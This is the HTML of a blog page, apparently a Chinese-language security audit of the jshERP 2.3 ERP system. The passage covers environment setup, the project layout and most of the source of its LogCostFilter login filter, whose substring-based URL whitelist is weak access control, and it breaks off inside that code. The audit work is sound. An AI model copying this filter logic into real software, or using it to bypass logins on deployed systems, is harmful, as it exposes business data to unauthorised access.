@@ -1,0 +1,1033 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/xvsf/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=xvsf/livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>华夏ERP 2.3 代码审计 | xvsf</title>
+<meta name="keywords" content="Java 代码审计">
+<meta name="description" content="华夏ERP 2.3 代码审计">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/xvsf/posts_backup/jsherp-2.3-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+<link crossorigin="anonymous" href="/xvsf/assets/css/stylesheet.da3211e5ef867bf2b75fd5a6515cfed7195c011e8ab735694e203810a827097b.css" integrity="sha256-2jIR5e&#43;Ge/K3X9WmUVz&#43;1xlcAR6KtzVpTiA4EKgnCXs=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/xvsf/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/xvsf/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/xvsf/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/xvsf/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/xvsf/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/xvsf/posts_backup/jsherp-2.3-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/xvsf/" accesskey="h" title="xvsf (Alt + H)">xvsf</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      华夏ERP 2.3 代码审计
+    </h1>
+    <div class="post-description">
+      华夏ERP 2.3 代码审计
+    </div>
+    <div class="post-meta"><span title='2025-08-20 14:00:00 +0000 UTC'>August 20, 2025</span>&nbsp;·&nbsp;<span>10 min</span>
+
+</div>
+  </header> 
+  <div class="post-content"><p>项目地址：<a href="https://github.com/jishenghua/jshERP/releases/tag/2.3">https://github.com/jishenghua/jshERP/releases/tag/2.3</a></p>
+<h1 id="环境搭建">环境搭建：<a hidden class="anchor" aria-hidden="true" href="#环境搭建">#</a></h1>
+<p>MySQL 5.7.26，IDEA，Maven 3.9.1，JDK 1.8，</p>
+<p>数据库新建jsh_erp数据库，导入sql文件</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201347449.png"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201347937.png"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348745.png">IDEA 的 JDK 版本切换为1.8</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508120917726.png"></p>
+<p>Maven构建</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348181.png"></p>
+<p>运行 ErpApplication.java 启动程序</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348557.png"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348403.png"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508120919189.png"></p>
+<h1 id="目录分析">目录分析<a hidden class="anchor" aria-hidden="true" href="#目录分析">#</a></h1>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348041.png"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348213.png"></p>
+<p>这个项目的结构更像是 MVC 架构（ Mapper/MapperXML； Controller  ），又增加了  Service 层 。</p>
+<ul>
+<li>Maven Assembly 插件，用于帮助打包； assembly.xml  是打包的配置文件</li>
+<li>bin 中的文件都是 jshERP 的运行脚本</li>
+<li>resources/mapper_xml： MyBatis 框架的 SQL 映射配置文件， “数据库操作说明书”</li>
+<li>logback-spring.xml：日志文件输出配置</li>
+<li>java
+<ul>
+<li>config
+<ul>
+<li><!-- raw HTML omitted -->PluginBeanConfig.java  插件管理器 Bean<!-- raw HTML omitted --></li>
+<li><!-- raw HTML omitted -->PluginConfiguration.java  配置插件系统的运行环境和参数  <!-- raw HTML omitted --></li>
+<li><!-- raw HTML omitted --> Swagger2Config.java      用于生成 RESTful API 文档 , 提供文档元信息  <!-- raw HTML omitted --></li>
+<li><!-- raw HTML omitted --> TenantConfig.java  项目数据库访问的<!-- raw HTML omitted -->统一拦截器和插件配置中心</li>
+<li>WebConfig.java 指定前端静态文件存放位置， 在 Spring Boot 内置 Web 服务器中生效</li>
+</ul>
+</li>
+<li>constants
+<ul>
+<li>BusinessConstants  <!-- raw HTML omitted -->业务字典类<!-- raw HTML omitted --></li>
+<li><!-- raw HTML omitted --> ExceptionConstants    异常与返回码管理类  <!-- raw HTML omitted --></li>
+</ul>
+</li>
+<li>controller      Web 层接口</li>
+<li>datasource      数据源和数据库访问配置</li>
+<li>exception    异常处理</li>
+<li>filter
+<ul>
+<li>LogCostFilter   自定义 Servlet 过滤器， 控制用户访问权限和登录请求处理</li>
+</ul>
+</li>
+<li>service     业务逻辑层</li>
+<li>utils    工具类</li>
+<li>ErpApplication.java    入口类，参考<a href="https://www.yuque.com/taohuayuanpang/kfw7zl/cqdlt0kgwyh524ay#vrt3I">SpringBoot-注解 @SpringBootApplication 分析</a></li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//声明 springboot，组合了@SpringBootConfiguration @EnableAutoConfiguration @ComponentScann</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="nd">@SpringBootApplication</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="c1">//MyBatis Mapper 接口扫描路径</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="nd">@MapperScan</span><span class="p">(</span><span class="s">&#34;com.jsh.erp.datasource.mappers&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="nd">@ServletComponentScan</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="nd">@EnableScheduling</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">ErpApplication</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ConfigurableApplicationContext</span><span class="w"> </span><span class="n">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SpringApplication</span><span class="p">.</span><span class="na">run</span><span class="p">(</span><span class="n">ErpApplication</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">args</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Environment</span><span class="w"> </span><span class="n">environment</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">context</span><span class="p">.</span><span class="na">getBean</span><span class="p">(</span><span class="n">Environment</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;启动成功，访问地址：http://&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">ComputerInfo</span><span class="p">.</span><span class="na">getIpAddr</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;:&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                           </span><span class="o">+</span><span class="w"> </span><span class="n">environment</span><span class="p">.</span><span class="na">getProperty</span><span class="p">(</span><span class="s">&#34;server.port&#34;</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;，测试用户：jsh，密码：123456&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><h1 id="代码审计">代码审计<a hidden class="anchor" aria-hidden="true" href="#代码审计">#</a></h1>
+<h2 id="1logcostfilterjava">1、LogCostFilter.java<a hidden class="anchor" aria-hidden="true" href="#1logcostfilterjava">#</a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.jsh.erp.filter</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.util.StringUtils</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.*</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.annotation.WebFilter</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.annotation.WebInitParam</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.http.HttpServletRequest</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.http.HttpServletResponse</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.ArrayList</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.List</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.regex.Matcher</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.regex.Pattern</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="nd">@WebFilter</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">filterName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;LogCostFilter&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//过滤器对所有路径都生效</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">urlPatterns</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s">&#34;/*&#34;</span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">initParams</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//要忽略的静态资源</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nd">@WebInitParam</span><span class="p">(</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;ignoredUrl&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;.css#.js#.jpg#.png#.gif#.ico&#34;</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//允许未登录访问的路径</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nd">@WebInitParam</span><span class="p">(</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;filterPath&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;/user/login#/user/registerUser#/v2/api-docs&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">LogCostFilter</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">Filter</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">FILTER_PATH</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;filterPath&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">IGNORED_PATH</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;ignoredUrl&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">List</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">ignoredList</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ArrayList</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">allowUrls</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">ignoredUrls</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//将 filterPath 和 ignoredUrl 解析成 allowUrls 和 ignoredList（白名单），用于后续 doFilter 判断</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">init</span><span class="p">(</span><span class="n">FilterConfig</span><span class="w"> </span><span class="n">filterConfig</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">filterPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">filterConfig</span><span class="p">.</span><span class="na">getInitParameter</span><span class="p">(</span><span class="n">FILTER_PATH</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">StringUtils</span><span class="p">.</span><span class="na">isEmpty</span><span class="p">(</span><span class="n">filterPath</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">allowUrls</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">filterPath</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="s">&#34;#&#34;</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">filterPath</span><span class="p">.</span><span class="na">split</span><span class="p">(</span><span class="s">&#34;#&#34;</span><span class="p">)</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="n">filterPath</span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">ignoredPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">filterConfig</span><span class="p">.</span><span class="na">getInitParameter</span><span class="p">(</span><span class="n">IGNORED_PATH</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">StringUtils</span><span class="p">.</span><span class="na">isEmpty</span><span class="p">(</span><span class="n">ignoredPath</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">ignoredUrls</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ignoredPath</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="s">&#34;#&#34;</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">ignoredPath</span><span class="p">.</span><span class="na">split</span><span class="p">(</span><span class="s">&#34;#&#34;</span><span class="p">)</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="n">ignoredPath</span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">ignoredUrl</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">ignoredUrls</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">ignoredList</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">ignoredUrl</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doFilter</span><span class="p">(</span><span class="n">ServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">ServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                         </span><span class="n">FilterChain</span><span class="w"> </span><span class="n">chain</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ServletException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">servletRequest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="p">)</span><span class="w"> </span><span class="n">request</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">servletResponse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">HttpServletResponse</span><span class="p">)</span><span class="w"> </span><span class="n">response</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">requestUrl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">servletRequest</span><span class="p">.</span><span class="na">getRequestURI</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//具体，比如：处理若用户未登录，则跳转到登录页</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">userInfo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">servletRequest</span><span class="p">.</span><span class="na">getSession</span><span class="p">().</span><span class="na">getAttribute</span><span class="p">(</span><span class="s">&#34;user&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">userInfo</span><span class="o">!=</span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">//如果已登录，不阻止</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">chain</span><span class="p">.</span><span class="na">doFilter</span><span class="p">(</span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">response</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//未登录时允许访问的页面</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">requestUrl</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="n">requestUrl</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="s">&#34;/doc.html&#34;</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                                   </span><span class="n">requestUrl</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="s">&#34;/register.html&#34;</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">requestUrl</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="s">&#34;/login.html&#34;</span><span class="p">)))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">chain</span><span class="p">.</span><span class="na">doFilter</span><span class="p">(</span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">response</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ignoredList</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">verify</span><span class="p">(</span><span class="n">ignoredList</span><span class="p">,</span><span class="w"> </span><span class="n">requestUrl</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">chain</span><span class="p">.</span><span class="na">doFilter</span><span class="p">(</span><span class="n">servletRequest</span><span class="p">,</span><span class="w"> </span><span class="n">response</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// allowUrls</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="kc">null</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">allowUrls</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">allowUrls</span><span class="p">.</span><span class="na">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">allowUrls</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">requestUrl</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="n">url</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">chain</span><span class="p">.</span><span class="na">doFilter</span><span class="p">(</span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">response</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">return</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//if 条件都不满足，重定向到 /login.html</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">servletResponse</span><span class="p">.</span><span class="na">sendRedirect</span><span class="p">(</span><span class="s">&#34;/login.html&#34;</span><span class="p">);</span><span class="w">
